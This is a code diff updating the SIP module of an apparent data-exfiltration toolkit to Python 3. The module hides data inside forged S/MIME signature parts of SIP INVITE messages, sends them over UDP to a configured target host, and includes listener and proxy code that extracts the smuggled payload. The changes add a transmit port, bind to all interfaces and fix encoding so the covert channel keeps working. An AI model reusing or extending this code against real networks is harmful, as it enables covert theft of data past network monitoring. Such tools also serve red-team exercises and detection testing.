@@ -108,7 +108,7 @@ class SIPDialog:
         sig = 'Content-Type: application/x-pkcs7-signature; name="smime.p7s"\r\n'
         sig += 'Content-Transfer-Encoding: base64\r\n'
         sig += 'Content-Disposition: attachment; filename="smime.p7s"; handling=required\r\n'
-        sig += base64.b64encode(payload)
+        sig += base64.b64encode(payload.encode()).decode()
         #forge sip body
         boundary = ''.join(random.sample(string.digits + string.ascii_letters, 20))
         packet.body = '--' + boundary + '\r\n'
@@ -117,6 +117,7 @@ class SIPDialog:
         packet.body += '--' + boundary + '\r\n'
         packet.body += sig + '\r\n'
         packet.body += '--' + boundary + '--'
+        packet.body = packet.body.encode()
         #replace sip header content-type with multipart/signed
         packet.headers['Content-Type'] = 'multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary=' + boundary
         #Update Content-Length
@@ -183,7 +184,7 @@ def listen():
     app_exfiltrate.log_message('info', "[sip] Listening for incoming calls")
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('', port))
+    sock.bind(('0.0.0.0', port))
     while True:
         data, addr = sock.recvfrom(65535)
         try:
@@ -204,9 +205,9 @@ def listen():
                     parser = re.compile('boundary=(.*)')
                     [boundary] = re.findall(parser, req.headers['content-type'])
                     #Hackish payload isolation
-                    payload = req.body.split('--'+boundary)[-2].split('\r\n')[-2]
+                    payload = req.body.decode().split('--'+boundary)[-2].split('\r\n')[-2]
                     app_exfiltrate.log_message('info', "[sip] Received {0} bytes from {1}".format(len(payload), addr[0]))
-                    app_exfiltrate.retrieve_data(base64.b64decode(payload))
+                    app_exfiltrate.retrieve_data(base64.b64decode(payload.encode()).decode())
         except Exception as e:
             print(traceback.format_exc())
             print('exception: ' + repr(e))
@@ -218,12 +219,13 @@ def send(data):
         target = choice(targets)
     else:
         target = config['target']
+    txport = config['txport']
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('', port))
+    sock.bind(('0.0.0.0', txport))
     dialog = SIPDialog()
     laddr = socket.gethostbyname(socket.getfqdn())
-    uac = UserAgent(caller, laddr, port=port)
+    uac = UserAgent(caller, laddr, port=txport)
     uas = UserAgent(callee, target, port=port)
     invite = dialog.invite(uac, uas, data)
     app_exfiltrate.log_message('info', "[sip] Sending {0} bytes to {1}".format(len(data), target))
@@ -250,7 +252,7 @@ def proxy():
     port = config['port']
     sender = ""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('', port))
+    sock.bind(('0.0.0.0', port))
     while True:
         data, addr = sock.recvfrom(65535)
         if addr[0] != target:
